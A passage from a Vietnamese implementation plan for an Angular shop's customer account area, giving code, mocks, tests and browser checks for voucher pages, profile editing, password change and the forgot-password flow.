              import('@features/client/pages/account/my-vouchers').then((m) => m.MyVouchers),
            data: { title: 'Voucher của tôi' },
          },
          {
            path: 'voucher-store',
            loadComponent: () =>
              import('@features/client/pages/account/voucher-store').then((m) => m.VoucherStore),
            data: { title: 'Kho voucher' },
          },
```

Trong `account-layout.ts`, thêm mục menu cho Kho voucher vào `links` (đặt ngay trước "Voucher của tôi"):

```ts
    { path: '/account/voucher-store', label: 'Kho voucher', icon: 'redeem' },
```

**Lưu ý:** mục "Ví của tôi" (`/account/wallet`) giữ nguyên `coming-soon` — bạn đã chốt bỏ qua, chưa quyết định. `WALLET_READ_SELF` thuộc Phase 3 theo API v0.2 mục 3.

- [ ] **Step 8: Build + kiểm chứng trên trình duyệt**

Run: `npx ng build`
Expected: build xanh.

Trên trình duyệt (`customer@demo.local` / `12345678`):
- `/account/voucher-store`: các voucher GLOBAL còn lượt, nút **Nhận voucher**; bấm → đổi thành **Đã nhận** ngay, thẻ mờ đi, có thông báo.
- Bấm lại (sau khi tải lại trang) → nút đã ở trạng thái Đã nhận, không bấm được.
- `/account/vouchers`: 4 thẻ với 4 trạng thái khác màu; chip lọc "Đã dùng" chỉ còn 1 thẻ; thẻ USED/EXPIRED mờ.
- Kiểm tra hạn hiện là `expires_at` của dòng ví (voucher USED hết hạn 31/12/2026), không phải hạn voucher gốc.
- 375px: một cột, không tràn ngang.

- [ ] **Step 9: Commit**

```bash
git add src/app/features/client/pages/account/voucher-store.* \
  src/app/features/client/pages/account/my-vouchers.* \
  src/app/features/client/layout/account-layout.ts src/app/app.routes.ts
git commit -m "feat(voucher): màn kho voucher và ví voucher của khách"
```

---

# CỤM 6 — Hồ sơ, Đổi mật khẩu, Quên/Đặt lại mật khẩu

Bốn màn xác thực dùng khuôn form dọc, không dùng `CrudPage`.

### Task 6.1: Hồ sơ cá nhân + Đổi mật khẩu

**Files:**
- Create: `src/app/features/client/pages/account/profile.ts`
- Create: `src/app/features/client/pages/account/profile.html`
- Create: `src/app/features/client/pages/account/profile.css`
- Create: `src/app/features/client/pages/account/security.ts`
- Create: `src/app/features/client/pages/account/security.html`
- Create: `src/app/features/client/pages/account/security.css`
- Modify: `src/app/app.routes.ts`
- Modify: `src/app/core/mock/mock-registry.ts`
- Test: `src/app/features/client/pages/account/security.spec.ts`

**Interfaces:**
- Consumes: `AuthService.getProfile()`, `updateProfile()`, `changePassword()`; `UpdateProfileRequest`, `ChangePasswordRequest`.
- Produces: `AccountProfile`, `AccountSecurity`; route `/account/profile`, `/account/security`.

- [ ] **Step 1: Thêm mock cho profile và đổi mật khẩu**

Trong `mock-registry.ts`, thêm nhánh trong `resolve()`:

```ts
    if (path === '/api/v1/profile' && m === 'GET') {
      return ok(this.currentMockUser(), 'Success');
    }
    if (path === '/api/v1/profile' && m === 'PUT') {
      return this.updateProfileMock(body);
    }
    if (path === '/api/v1/auth/change-password' && m === 'POST') {
      return this.changePasswordMock(body);
    }
```

Thêm field + method:

```ts
  /** Mật khẩu hiện tại của tài khoản mock — đổi được trong phiên chạy. */
  private mockPassword = MOCK_PASSWORD;
  /** Hồ sơ đã sửa trong phiên — giữ để lần GET sau thấy thay đổi. */
  private profileOverride: Partial<User> | null = null;

  private currentMockUser(): User {
    const base = findMockUser('customer@demo.local') as User;
    return { ...base, ...(this.profileOverride ?? {}) };
  }

  /** PUT /profile — chỉ nhận full_name, phone, avatar_url (API v0.2 mục 2.2). */
  private updateProfileMock(body: unknown): unknown {
    const p = (body ?? {}) as UpdateProfileRequest;
    // Whitelist: field ngoài danh sách bị BỎ QUA, không lỗi (API v0.2 mục 2.2).
    this.profileOverride = {
      ...(this.profileOverride ?? {}),
      ...(p.full_name !== undefined ? { full_name: p.full_name } : {}),
      ...(p.phone !== undefined ? { phone: p.phone } : {}),
      ...(p.avatar_url !== undefined ? { avatar_url: p.avatar_url } : {}),
    };
    return ok(this.currentMockUser(), 'Cập nhật hồ sơ thành công');
  }

  /** POST /auth/change-password — sai mật khẩu hiện tại trả 1007. */
  private changePasswordMock(body: unknown): unknown {
    const p = (body ?? {}) as ChangePasswordRequest;
    if (p.current_password !== this.mockPassword) {
      return { code: 1007, message: 'Mật khẩu hiện tại không đúng', data: null };
    }
    if (!p.new_password || p.new_password.length < 8) {
      return businessError('Mật khẩu mới phải có ít nhất 8 ký tự');
    }
    this.mockPassword = p.new_password;
    return ok(null, 'Đổi mật khẩu thành công');
  }
```

Thêm import `User, UpdateProfileRequest, ChangePasswordRequest` từ `@core/models/auth.model`, và `MOCK_PASSWORD` đã có sẵn.

**Lưu ý:** `login()` trong registry đang so với hằng `MOCK_PASSWORD`. Đổi sang so với `this.mockPassword` để sau khi đổi mật khẩu thì đăng nhập bằng mật khẩu mới:

```ts
    if (!found || payload.password !== this.mockPassword) {
```

- [ ] **Step 2: Viết màn Hồ sơ — TS**

Tạo `profile.ts`:

```ts
import { ChangeDetectionStrategy, Component, inject, signal } from '@angular/core';
import { FormsModule } from '@angular/forms';
import { MatIconModule } from '@angular/material/icon';
import { MatSnackBar } from '@angular/material/snack-bar';
import { AuthService } from '@core/services/auth.service';
import { AppButton } from '@shared/ui/app-button/app-button';
import { AppCard } from '@shared/ui/app-card/app-card';
import { LoadingState } from '@shared/ui/loading-state/loading-state';

/**
 * Hồ sơ cá nhân — PRO-01/PRO-02 (API v0.2 mục 2.2).
 *
 * Chỉ sửa được `full_name`, `phone`, `avatar_url`. `email`, trạng thái và vai
 * trò KHÔNG sửa được ở đây (API ghi rõ) — email đổi qua luồng riêng, còn lại
 * chỉ ADMIN. Vì vậy hiện chúng ở dạng chỉ đọc kèm ghi chú, không phải ô nhập.
 */
@Component({
  selector: 'app-account-profile',
  changeDetection: ChangeDetectionStrategy.OnPush,
  imports: [FormsModule, MatIconModule, AppButton, AppCard, LoadingState],
  templateUrl: './profile.html',
  styleUrl: './profile.css',
})
export class AccountProfile {
  private readonly authService = inject(AuthService);
  private readonly snackBar = inject(MatSnackBar);

  protected readonly loading = signal(true);
  protected readonly saving = signal(false);
  protected readonly errors = signal<Record<string, string>>({});
  /** Ảnh đại diện tải lỗi → hiện khung nền thay vì icon ảnh vỡ. */
  protected readonly imageBroken = signal(false);

  protected readonly draft = signal({
    full_name: '',
    phone: '',
    avatar_url: '',
    email: '',
  });

  constructor() {
    this.authService.getProfile().subscribe({
      next: (res) => {
        this.draft.set({
          full_name: res.data.full_name,
          phone: res.data.phone ?? '',
          avatar_url: res.data.avatar_url ?? '',
          email: res.data.email,
        });
        this.loading.set(false);
      },
      error: (err: Error) => {
        this.snackBar.open(err.message, 'Đóng', { duration: 3000 });
        this.loading.set(false);
      },
    });
  }

  protected setDraft(field: 'full_name' | 'phone' | 'avatar_url', value: string): void {
    this.draft.set({ ...this.draft(), [field]: value });
    if (this.errors()[field]) {
      const next = { ...this.errors() };
      delete next[field];
      this.errors.set(next);
    }
  }

  protected fieldError(key: string): string {
    return this.errors()[key] ?? '';
  }

  protected markImageBroken(): void {
    this.imageBroken.set(true);
  }

  private validate(): boolean {
    const d = this.draft();
    const errors: Record<string, string> = {};

    if (!d.full_name.trim()) {
      errors['full_name'] = 'Họ tên không được để trống';
    }
    if (d.phone && !/^0\d{9}$/.test(d.phone.trim())) {
      errors['phone'] = 'Số điện thoại phải gồm 10 số, bắt đầu bằng 0';
    }

    this.errors.set(errors);
    return Object.keys(errors).length === 0;
  }

  protected save(): void {
    if (!this.validate()) {
      this.snackBar.open('Vui lòng kiểm tra lại các ô được đánh dấu', 'Đóng', { duration: 3000 });
      return;
    }

    const d = this.draft();
    this.saving.set(true);
    this.authService
      .updateProfile({
        full_name: d.full_name.trim(),
        phone: d.phone.trim() || undefined,
        avatar_url: d.avatar_url.trim() || undefined,
      })
      .subscribe({
        next: (res) => {
          this.saving.set(false);
          this.snackBar.open('Đã lưu hồ sơ', 'Đóng', { duration: 3000 });
        },
        error: (err: Error) => {
          this.saving.set(false);
          this.snackBar.open(err.message, 'Đóng', { duration: 4000 });
        },
      });
  }

  /**
   * Đọc ảnh từ máy thành data URL.
   *
   * Cùng cách làm với ô ảnh của form CRUD: BE có endpoint upload riêng cho
   * avatar (`POST /profile/avatar`, multipart) nhưng chưa nối — khi nối thì chỉ
   * đổi chỗ này thành gọi upload rồi lưu URL trả về.
   */
  protected onPickImage(event: Event): void {
    const input = event.target as HTMLInputElement;
    const file = input.files?.[0];
    if (!file) return;

    if (!file.type.startsWith('image/')) {
      this.snackBar.open('Vui lòng chọn một tệp ảnh', 'Đóng', { duration: 3000 });
      input.value = '';
      return;
    }
    if (file.size > 2 * 1024 * 1024) {
      this.snackBar.open('Ảnh vượt quá 2 MB', 'Đóng', { duration: 3000 });
      input.value = '';
      return;
    }

    const reader = new FileReader();
    reader.onload = () => {
      this.setDraft('avatar_url', reader.result as string);
      this.imageBroken.set(false);
      input.value = '';
    };
    reader.readAsDataURL(file);
  }
}
```

- [ ] **Step 3: Viết màn Hồ sơ — HTML**

Tạo `profile.html`:

```html
@if (loading()) {
  <app-app-card><app-loading-state /></app-app-card>
} @else {
  <app-app-card title="Hồ sơ cá nhân">
    <div class="avatar-row">
      <div class="avatar">
        @if (draft().avatar_url && !imageBroken()) {
          <img [src]="draft().avatar_url" alt="" (error)="markImageBroken()" />
        } @else {
          <mat-icon aria-hidden="true">person</mat-icon>
        }
      </div>

      <div class="avatar-row__ctl">
        <label class="pick">
          <mat-icon>upload</mat-icon>
          Chọn ảnh đại diện
          <input type="file" accept="image/*" (change)="onPickImage($event)" />
        </label>
        @if (draft().avatar_url) {
          <button class="clear" type="button" (click)="setDraft('avatar_url', '')">Xóa ảnh</button>
        }
        <span class="hint">Tối đa 2 MB. Ảnh vuông hiển thị đẹp nhất.</span>
      </div>
    </div>

    <div class="form-grid">
      <div class="field">
        <label for="pf-email">Email</label>
        <input id="pf-email" type="email" [value]="draft().email" disabled />
        <span class="hint">Email không đổi được ở đây</span>
      </div>

      <div class="field" [class.field--error]="fieldError('full_name')">
        <label for="pf-name">Họ tên <span class="req">*</span></label>
        <input
          id="pf-name"
          type="text"
          maxlength="150"
          [ngModel]="draft().full_name"
          (ngModelChange)="setDraft('full_name', $event)"
        />
        @if (fieldError('full_name'); as msg) {
          <span class="field__err">{{ msg }}</span>
        }
      </div>

      <div class="field" [class.field--error]="fieldError('phone')">
        <label for="pf-phone">Số điện thoại</label>
        <input
          id="pf-phone"
          type="tel"
          maxlength="20"
          [ngModel]="draft().phone"
          (ngModelChange)="setDraft('phone', $event)"
          placeholder="Ví dụ 0912345678"
        />
        @if (fieldError('phone'); as msg) {
          <span class="field__err">{{ msg }}</span>
        }
      </div>
    </div>

    <div class="actions">
      <app-app-button [disabled]="saving()" (clicked)="save()">
        {{ saving() ? 'Đang lưu…' : 'Lưu thay đổi' }}
      </app-app-button>
    </div>
  </app-app-card>
}
```

- [ ] **Step 4: Viết màn Hồ sơ — CSS**

Tạo `profile.css`:

```css
.avatar-row {
  display: flex;
  gap: 18px;
  align-items: flex-start;
  margin-bottom: 22px;
}

.avatar {
  width: 92px;
  height: 92px;
  flex: 0 0 auto;
  border-radius: 50%;
  overflow: hidden;
  background: var(--color-surface-alt);
  border: 1px solid var(--color-border);
  display: flex;
  align-items: center;
  justify-content: center;
  color: var(--color-ink-subtle);
}

.avatar img {
  width: 100%;
  height: 100%;
  object-fit: cover;
}

.avatar mat-icon {
  font-size: 42px;
  width: 42px;
  height: 42px;
}

.avatar-row__ctl {
  display: flex;
  flex-direction: column;
  gap: 8px;
  align-items: flex-start;
  padding-top: 6px;
}

.pick {
  display: inline-flex;
  align-items: center;
  gap: 7px;
  border: 1.5px dashed var(--color-border);
  border-radius: var(--radius);
  padding: 9px 14px;
  font-size: 13px;
  font-weight: 600;
  cursor: pointer;
  background: var(--color-surface-alt);
}

.pick:hover {
  border-color: var(--color-primary-bright);
  color: var(--color-primary);
}

.pick mat-icon {
  font-size: 18px;
  width: 18px;
  height: 18px;
}

/* Input file ẩn nhưng vẫn nhận click từ label bao ngoài. */
.pick input[type='file'] {
  position: absolute;
  width: 1px;
  height: 1px;
  opacity: 0;
  pointer-events: none;
}

.clear {
  border: 0;
  background: transparent;
  color: var(--color-danger);
  font-family: var(--font-body);
  font-size: 13px;
  font-weight: 600;
  cursor: pointer;
  padding: 0;
}

.clear:hover {
  text-decoration: underline;
}

.form-grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 16px;
}

.field {
  display: flex;
  flex-direction: column;
  gap: 5px;
  min-width: 0;
}

.field label {
  font-size: 12px;
  font-weight: 600;
  color: var(--color-ink);
}

.req {
  color: var(--color-danger);
}

.field input {
  font-family: var(--font-body);
  font-size: 14.5px;
  padding: 11px 13px;
  border: 1.5px solid var(--color-border);
  border-radius: var(--radius);
  background: var(--color-surface);
  color: var(--color-ink);
  outline: none;
  width: 100%;
}

.field input:focus {
  border-color: var(--color-primary-bright);
  box-shadow: 0 0 0 3px rgba(1, 148, 243, 0.14);
}

.field input:disabled {
  background: var(--color-surface-alt);
  color: var(--color-ink-subtle);
  cursor: not-allowed;
}

.field--error input {
  border-color: var(--color-danger);
}

.hint {
  font-size: 11.5px;
  color: var(--color-ink-subtle);
}

.field__err {
  font-size: 11.5px;
  color: var(--color-danger);
  font-weight: 600;
}

.actions {
  display: flex;
  justify-content: flex-end;
  margin-top: 20px;
}

@media (max-width: 700px) {
  .form-grid {
    grid-template-columns: 1fr;
  }

  .avatar-row {
    flex-direction: column;
    align-items: center;
  }

  .avatar-row__ctl {
    align-items: center;
  }
}
```

- [ ] **Step 5: Viết màn Đổi mật khẩu — TS**

Tạo `security.ts`:

```ts
import { ChangeDetectionStrategy, Component, computed, inject, signal } from '@angular/core';
import { AbstractControl, FormBuilder, ReactiveFormsModule, ValidationErrors, Validators } from '@angular/forms';
import { MatIconModule } from '@angular/material/icon';
import { MatSnackBar } from '@angular/material/snack-bar';
import { Router } from '@angular/router';
import { AuthService } from '@core/services/auth.service';
import { AppButton } from '@shared/ui/app-button/app-button';
import { AppCard } from '@shared/ui/app-card/app-card';

/**
 * Kiểm tra hai ô mật khẩu khớp nhau — gắn ở cấp NHÓM, không phải cấp ô.
 *
 * Vì sao cần: API `POST /auth/change-password` chỉ nhận MỘT `new_password`, nên
 * server không biết khách gõ nhầm. Nếu FE không kiểm tra, khách gõ nhầm ô xác
 * nhận sẽ đổi mật khẩu thành giá trị họ không nhớ — và bị khoá khỏi tài khoản.
 */
function passwordsMatch(group: AbstractControl): ValidationErrors | null {
  const next = group.get('new_password')?.value;
  const confirm = group.get('confirm_password')?.value;
  return next && confirm && next !== confirm ? { mismatch: true } : null;
}

/** AUTH-05 — API v0.2 mục 2.1. */
@Component({
  selector: 'app-account-security',
  changeDetection: ChangeDetectionStrategy.OnPush,
  imports: [ReactiveFormsModule, MatIconModule, AppButton, AppCard],
  templateUrl: './security.html',
  styleUrl: './security.css',
})
export class AccountSecurity {
  private readonly fb = inject(FormBuilder);
  private readonly authService = inject(AuthService);
  private readonly snackBar = inject(MatSnackBar);
  private readonly router = inject(Router);

  protected readonly saving = signal(false);
  protected readonly showPassword = signal(false);

  protected readonly form = this.fb.nonNullable.group(
    {
      current_password: ['', [Validators.required]],
      new_password: ['', [Validators.required, Validators.minLength(8)]],
      confirm_password: ['', [Validators.required]],
    },
    { validators: passwordsMatch },
  );

  protected readonly mismatch = computed(() => this.form.hasError('mismatch'));

  /** Chỉ hiện lỗi sau khi khách đã chạm vào ô — không mắng khi vừa mở trang. */
  protected showError(control: 'current_password' | 'new_password' | 'confirm_password'): boolean {
    const c = this.form.controls[control];
    return c.touched && c.invalid;
  }

  protected toggleShow(): void {
    this.showPassword.set(!this.showPassword());
  }

  protected submit(): void {
    if (this.form.invalid) {
      this.form.markAllAsTouched();
      if (this.mismatch()) {
        this.snackBar.open('Mật khẩu xác nhận không khớp', 'Đóng', { duration: 3000 });
      }
      return;
    }

    this.saving.set(true);
    const { current_password, new_password } = this.form.getRawValue();
    this.authService.changePassword({ current_password, new_password }).subscribe({
      next: () => {
        this.saving.set(false);
        this.form.reset();
        this.snackBar.open('Đổi mật khẩu thành công', 'Đóng', { duration: 3000 });
      },
      error: (err: Error) => {
        this.saving.set(false);
        // Sai mật khẩu hiện tại (1007) rơi vào đây.
        this.snackBar.open(err.message, 'Đóng', { duration: 4000 });
      },
    });
  }
}
```

- [ ] **Step 6: Viết màn Đổi mật khẩu — HTML**

Tạo `security.html`:

```html
<app-app-card title="Đổi mật khẩu">
  <p class="note">
    Sau khi đổi, mật khẩu mới có hiệu lực ngay cho lần đăng nhập kế tiếp.
  </p>

  <form class="form" [formGroup]="form" (ngSubmit)="submit()">
    <div class="field" [class.field--error]="showError('current_password')">
      <label for="sc-cur">Mật khẩu hiện tại <span class="req">*</span></label>
      <div class="pw">
        <input
          id="sc-cur"
          [type]="showPassword() ? 'text' : 'password'"
          formControlName="current_password"
          autocomplete="current-password"
        />
      </div>
      @if (showError('current_password')) {
        <span class="field__err">Vui lòng nhập mật khẩu hiện tại</span>
      }
    </div>

    <div class="field" [class.field--error]="showError('new_password')">
      <label for="sc-new">Mật khẩu mới <span class="req">*</span></label>
      <div class="pw">
        <input
          id="sc-new"
          [type]="showPassword() ? 'text' : 'password'"
          formControlName="new_password"
          autocomplete="new-password"
        />
        <button
          class="pw__toggle"
          type="button"
          [attr.aria-label]="showPassword() ? 'Ẩn mật khẩu' : 'Hiện mật khẩu'"
          (click)="toggleShow()"
        >
          <mat-icon>{{ showPassword() ? 'visibility_off' : 'visibility' }}</mat-icon>
        </button>
      </div>
      @if (showError('new_password')) {
        <span class="field__err">Mật khẩu mới phải có ít nhất 8 ký tự</span>
      } @else {
        <span class="hint">Ít nhất 8 ký tự</span>
      }
    </div>

    <div class="field" [class.field--error]="showError('confirm_password') || mismatch()">
      <label for="sc-conf">Nhập lại mật khẩu mới <span class="req">*</span></label>
      <input
        id="sc-conf"
        [type]="showPassword() ? 'text' : 'password'"
        formControlName="confirm_password"
        autocomplete="new-password"
      />
      @if (mismatch()) {
        <span class="field__err">Mật khẩu xác nhận không khớp</span>
      }
    </div>

    <div class="actions">
      <app-app-button type="submit" [disabled]="saving()">
        {{ saving() ? 'Đang lưu…' : 'Đổi mật khẩu' }}
      </app-app-button>
    </div>
  </form>
</app-app-card>
```

- [ ] **Step 7: Viết màn Đổi mật khẩu — CSS**

Tạo `security.css`:

```css
.note {
  margin: 0 0 18px;
  padding: 11px 13px;
  background: var(--color-info-soft);
  color: var(--color-on-info-soft);
  border-left: 3px solid var(--color-primary-bright);
  border-radius: var(--radius);
  font-size: 12.5px;
  line-height: 1.55;
}

.form {
  display: flex;
  flex-direction: column;
  gap: 16px;
  max-width: 440px;
}

.field {
  display: flex;
  flex-direction: column;
  gap: 5px;
}

.field label {
  font-size: 12px;
  font-weight: 600;
  color: var(--color-ink);
}

.req {
  color: var(--color-danger);
}

.pw {
  position: relative;
  display: flex;
  align-items: center;
}

.pw input,
.field input {
  font-family: var(--font-body);
  font-size: 14.5px;
  padding: 11px 13px;
  border: 1.5px solid var(--color-border);
  border-radius: var(--radius);
  background: var(--color-surface);
  color: var(--color-ink);
  outline: none;
  width: 100%;
}

.pw input {
  padding-right: 44px;
}

.pw input:focus,
.field input:focus {
  border-color: var(--color-primary-bright);
  box-shadow: 0 0 0 3px rgba(1, 148, 243, 0.14);
}

.field--error input {
  border-color: var(--color-danger);
}

.pw__toggle {
  position: absolute;
  right: 6px;
  border: 0;
  background: transparent;
  color: var(--color-ink-subtle);
  cursor: pointer;
  display: inline-flex;
  align-items: center;
  padding: 6px;
}

.pw__toggle:hover {
  color: var(--color-primary);
}

.pw__toggle mat-icon {
  font-size: 19px;
  width: 19px;
  height: 19px;
}

.hint {
  font-size: 11.5px;
  color: var(--color-ink-subtle);
}

.field__err {
  font-size: 11.5px;
  color: var(--color-danger);
  font-weight: 600;
}

.actions {
  display: flex;
  justify-content: flex-end;
  margin-top: 4px;
}
```

- [ ] **Step 8: Viết test**

Tạo `security.spec.ts`:

```ts
import { provideHttpClient, withInterceptors } from '@angular/common/http';
import { TestBed } from '@angular/core/testing';
import { provideRouter } from '@angular/router';
import { MockRegistry } from '@core/mock/mock-registry';
import { mockInterceptor } from '@core/mock/mock.interceptor';
import { AccountSecurity } from '@features/client/pages/account/security';

describe('AccountSecurity', () => {
  beforeEach(async () => {
    await TestBed.configureTestingModule({
      imports: [AccountSecurity],
      providers: [
        provideRouter([]),
        MockRegistry,
        provideHttpClient(withInterceptors([mockInterceptor])),
      ],
    }).compileComponents();
  });

  it('báo lỗi khi hai ô mật khẩu không khớp', async () => {
    const fixture = TestBed.createComponent(AccountSecurity);
    fixture.detectChanges();

    const cmp = fixture.componentInstance as unknown as {
      form: { setValue: (v: unknown) => void; markAllAsTouched: () => void };
    };
    cmp.form.setValue({
      current_password: '12345678',
      new_password: 'newpass123',
      confirm_password: 'khac-hoan-toan',
    });
    cmp.form.markAllAsTouched();
    fixture.detectChanges();

    expect((fixture.nativeElement as HTMLElement).textContent).toContain('không khớp');
  });

  it('mật khẩu mới dưới 8 ký tự bị coi là không hợp lệ', async () => {
    const fixture = TestBed.createComponent(AccountSecurity);
    fixture.detectChanges();

    const cmp = fixture.componentInstance as unknown as {
      form: { setValue: (v: unknown) => void; markAllAsTouched: () => void; invalid: boolean };
    };
    cmp.form.setValue({
      current_password: '12345678',
      new_password: 'abc',
      confirm_password: 'abc',
    });
    cmp.form.markAllAsTouched();

    expect(cmp.form.invalid).toBe(true);
  });
});
```

- [ ] **Step 9: Thêm route**

Trong `src/app/app.routes.ts`, trong khối `account`, **xóa** `...comingSoonAccount('profile', 'Hồ sơ cá nhân'),` và `...comingSoonAccount('security', 'Đổi mật khẩu'),` rồi thêm:

```ts
          {
            path: 'profile',
            loadComponent: () =>
              import('@features/client/pages/account/profile').then((m) => m.AccountProfile),
            data: { title: 'Hồ sơ cá nhân' },
          },
          {
            path: 'security',
            loadComponent: () =>
              import('@features/client/pages/account/security').then((m) => m.AccountSecurity),
            data: { title: 'Đổi mật khẩu' },
          },
```

- [ ] **Step 10: Chạy test + build + kiểm chứng**

Run: `npx ng test --watch=false` → PASS.
Run: `npx ng build` → xanh.

Trên trình duyệt (`customer@demo.local`):
- `/account/profile`: hiện email (chỉ đọc), họ tên, SĐT, avatar; sửa họ tên → Lưu → tải lại trang vẫn thấy giá trị mới (mock giữ trong phiên).
- `/account/security`: gõ mật khẩu hiện tại sai → Lưu → thông báo *"Mật khẩu hiện tại không đúng"*. Gõ đúng `12345678`, mật khẩu mới `newpass123` ở cả hai ô → thành công.
- Nhập hai ô mới khác nhau → hiện lỗi ngay dưới ô xác nhận, không gửi request.
- 375px: form một cột, không tràn ngang.

- [ ] **Step 11: Commit**

```bash
git add src/app/features/client/pages/account/profile.* \
  src/app/features/client/pages/account/security.* \
  src/app/core/mock/mock-registry.ts src/app/app.routes.ts
git commit -m "feat(account): màn hồ sơ cá nhân và đổi mật khẩu"
```

### Task 6.2: Quên mật khẩu & Đặt lại mật khẩu

**Files:**
- Create: `src/app/features/client/pages/forgot-password/forgot-password.ts`
- Create: `src/app/features/client/pages/forgot-password/forgot-password.html`
- Create: `src/app/features/client/pages/forgot-password/forgot-password.css`
- Create: `src/app/features/client/pages/reset-password/reset-password.ts`
- Create: `src/app/features/client/pages/reset-password/reset-password.html`
- Create: `src/app/features/client/pages/reset-password/reset-password.css`
- Modify: `src/app/core/services/auth.service.ts`
- Modify: `src/app/core/mock/mock-registry.ts`
- Modify: `src/app/app.routes.ts`
- Test: `src/app/features/client/pages/forgot-password/forgot-password.spec.ts`

**Interfaces:**
- Consumes: `AuthService.requestPasswordReset(email)` (đã có), cần thêm `confirmPasswordReset`.
- Produces: `ForgotPassword`, `ResetPassword`; route `/forgot-password`, `/reset-password`.

- [ ] **Step 1: Thêm method vào AuthService**

Trong `src/app/core/services/auth.service.ts`, thêm sau `requestPasswordReset`:

```ts
  /**
   * Đặt lại mật khẩu bằng token nhận qua email — AUTH-04 (API v0.2 mục 2.1).
   * Token sai/hết hạn trả `1006`.
   */
  confirmPasswordReset(token: string, newPassword: string): Observable<ApiResponse<null>> {
    return this.http.post<ApiResponse<null>>(`${this.baseUrl}/auth/password-reset/confirm`, {
      token,
      new_password: newPassword,
    });
  }
```

- [ ] **Step 2: Thêm mock**

Trong `mock-registry.ts`, thêm nhánh:

```ts
    if (path === '/api/v1/auth/password-reset/request' && m === 'POST') {
      // API v0.2 mục 2.1: LUÔN trả 200 với message trung tính, kể cả email không
      // tồn tại — chống dò tài khoản. Mock giữ đúng hành vi đó.
      return ok(null, 'Nếu email tồn tại, hướng dẫn đặt lại mật khẩu đã được gửi');
    }
    if (path === '/api/v1/auth/password-reset/confirm' && m === 'POST') {
      return this.confirmResetMock(body);
    }
```

Thêm field + method:

```ts
  /** Token đặt lại hợp lệ trong phiên chạy — mock nhận đúng một token cố định. */
  private static readonly MOCK_RESET_TOKEN = 'mock-reset-token';

  private confirmResetMock(body: unknown): unknown {
    const p = (body ?? {}) as { token?: string; new_password?: string };
    if (p.token !== MockRegistry.MOCK_RESET_TOKEN) {
      return businessError('Liên kết đặt lại mật khẩu không hợp lệ hoặc đã hết hạn');
    }
    if (!p.new_password || p.new_password.length < 8) {
      return businessError('Mật khẩu mới phải có ít nhất 8 ký tự');
    }
    this.mockPassword = p.new_password;
    return ok(null, 'Đặt lại mật khẩu thành công');
  }
```

- [ ] **Step 3: Viết trang Quên mật khẩu — TS**

Tạo `forgot-password.ts`:

```ts
import { ChangeDetectionStrategy, Component, inject, signal } from '@angular/core';
import { FormBuilder, ReactiveFormsModule, Validators } from '@angular/forms';
import { RouterLink } from '@angular/router';
import { MatIconModule } from '@angular/material/icon';
import { AuthService } from '@core/services/auth.service';
import { AuthAside } from '@shared/components/auth-aside/auth-aside';

/**
 * AUTH-04 (bước 1) — yêu cầu đặt lại mật khẩu (API v0.2 mục 2.1).
 *
 * Vì sao LUÔN hiện thông báo trung tính sau khi gửi, kể cả email không tồn tại:
 * API cố ý không tiết lộ email nào có trong hệ thống. Nếu FE hiện "email không
 * tồn tại" thì kẻ tấn công dùng trang này để dò danh sách khách hàng — vô hiệu
 * hoá chính biện pháp bảo vệ của Backend.
 */
@Component({
  selector: 'app-forgot-password',
  changeDetection: ChangeDetectionStrategy.OnPush,
  imports: [ReactiveFormsModule, RouterLink, MatIconModule, AuthAside],
  templateUrl: './forgot-password.html',
  styleUrl: './forgot-password.css',
})
export class ForgotPassword {
  private readonly fb = inject(FormBuilder);
  private readonly authService = inject(AuthService);

  protected readonly loading = signal(false);
  protected readonly sent = signal(false);
  /** Email đã gửi — hiện lại trong thông báo để khách kiểm tra đã gõ đúng chưa. */
  protected readonly sentTo = signal('');

  protected readonly form = this.fb.nonNullable.group({
    email: ['', [Validators.required, Validators.email]],
  });

  protected showError(): boolean {
    const c = this.form.controls.email;
    return c.touched && c.invalid;
  }

  protected submit(): void {
    if (this.form.invalid) {
      this.form.markAllAsTouched();
      return;
    }

    this.loading.set(true);
    const email = this.form.getRawValue().email;
    this.authService.requestPasswordReset(email).subscribe({
      next: () => {
        this.loading.set(false);
        this.sentTo.set(email);
        this.sent.set(true);
      },
      error: () => {
        // Kể cả khi mạng lỗi, không tiết lộ email có tồn tại hay không.
        this.loading.set(false);
        this.sentTo.set(email);
        this.sent.set(true);
      },
    });
  }

  protected reset(): void {
    this.sent.set(false);
    this.form.reset();
  }
}
```

- [ ] **Step 4: Viết trang Quên mật khẩu — HTML**

Tạo `forgot-password.html`. Bám khuôn chia đôi của `login.html` (`auth__aside` + form):

```html
<div class="auth">
  <app-auth-aside />

  <div class="auth__form">
    <div class="auth__box">
      @if (sent()) {
        <div class="done">
          <mat-icon aria-hidden="true">mark_email_read</mat-icon>
          <h1>Kiểm tra hộp thư</h1>
          <p>
            Nếu <strong>{{ sentTo() }}</strong> có tài khoản trong hệ thống, chúng tôi đã gửi
            hướng dẫn đặt lại mật khẩu. Vui lòng kiểm tra cả thư mục spam.
          </p>
          <button class="link" type="button" (click)="reset()">Dùng email khác</button>
          <a class="back" routerLink="/login">Về trang đăng nhập</a>
        </div>
      } @else {
        <h1>Quên mật khẩu</h1>
        <p class="sub">Nhập email đăng nhập, chúng tôi sẽ gửi liên kết đặt lại mật khẩu.</p>

        <form [formGroup]="form" (ngSubmit)="submit()">
          <div class="field" [class.field--error]="showError()">
            <label for="fp-email">Email</label>
            <input
              id="fp-email"
              type="email"
              formControlName="email"
              autocomplete="email"
              placeholder="ban@example.com"
            />
            @if (showError()) {
              <span class="field__err">Email không hợp lệ</span>
            }
          </div>

          <button class="submit" type="submit" [disabled]="loading()">
            {{ loading() ? 'Đang gửi…' : 'Gửi hướng dẫn' }}
          </button>
        </form>

        <a class="back" routerLink="/login">Về trang đăng nhập</a>
      }
    </div>
  </div>
</div>
```

- [ ] **Step 5: Viết trang Quên mật khẩu — CSS**

Tạo `forgot-password.css`. Sao chép `.auth`, `.auth__form`, `.auth__box`, `.field`, `.submit`, `.field__err` từ `login.css` (giữ nguyên giá trị), rồi thêm:

```css
.sub {
  margin: 0 0 20px;
  font-size: 13.5px;
  color: var(--color-ink-muted);
  line-height: 1.55;
}

.back {
  display: inline-block;
  margin-top: 18px;
  font-size: 13px;
  font-weight: 600;
  color: var(--color-primary-bright);
  text-decoration: none;
}

.back:hover {
  text-decoration: underline;
}

.done {
  text-align: center;
}

.done mat-icon {
  font-size: 52px;
  width: 52px;
  height: 52px;
  color: var(--color-success);
  margin-bottom: 10px;
}

.done h1 {
  font-family: var(--font-heading);
  font-size: 21px;
  font-weight: 700;
  margin: 0 0 10px;
}

.done p {
  margin: 0 0 16px;
  font-size: 13.5px;
  color: var(--color-ink-muted);
